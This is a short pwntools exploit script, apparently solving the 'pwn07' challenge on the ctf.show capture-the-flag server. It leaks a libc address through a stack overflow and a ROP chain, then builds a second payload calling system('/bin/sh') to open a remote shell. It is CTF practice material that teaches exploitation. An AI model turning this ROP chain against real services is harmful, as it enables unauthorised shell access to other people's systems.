from pwn import *

context.arch = 'amd64'

io = remote("pwn.challenge.ctf.show", 28160)
# io = process("pwn07")
e = ELF('pwn07')

main_addr = e.symbols['welcome']
puts_plt = e.symbols["puts"]
puts_got = e.got["puts"]
pop_rdi_ret = 0x04006e3

junk = 'a' * (0xc + 8)

payload = flat(junk, pop_rdi_ret, puts_got, puts_plt, main_addr)

io.sendline(payload)

addr = io.recv().strip(b'\n')[-6:]
addr = unpack(addr.ljust(8, b'\x00'))  # 地址是6bytes, 补到8位unpack
print(hex(addr))

# https://libc.blukat.me/ 查一下 puts 9c0  查后三位就行
ret = 0x000040061E
system_addr = 0x04f440
puts = 0x0809c0
str_bin_sh = 0x1b3e9a
base = addr - puts

system = base + system_addr
bin_sh = base + str_bin_sh
payload = flat(junk, ret, pop_rdi_ret, bin_sh, system)  # ubuntu64需要栈对齐, 加个ret
io.sendline(payload)

io.interactive()

# 本地exp
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# base = addr - libc.symbols['puts']
#
# system = base + libc.symbols["system"]
# bin_sh = base + libc.search(b'/bin/sh').__next__()
# payload = flat(junk, pop_rdi_ret, bin_sh, system)
# io.sendline(payload)
#
# io.interactive()
